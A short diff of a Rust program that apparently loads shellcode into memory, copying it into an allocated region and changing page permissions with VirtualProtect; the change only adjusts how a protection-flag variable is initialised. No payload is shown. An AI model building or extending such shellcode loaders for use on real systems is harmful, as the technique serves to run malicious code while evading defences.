@@ -44,7 +44,7 @@ fn main() {
         copy(shellcode.as_ptr() as _, shellcode_addr, shellcode.len());
 
         println!("[+] Changing Page Permissions");
-        let mut old_protection: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
+        let mut old_protection: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
         VirtualProtect(
             shellcode_addr,
             shellcode.len(),
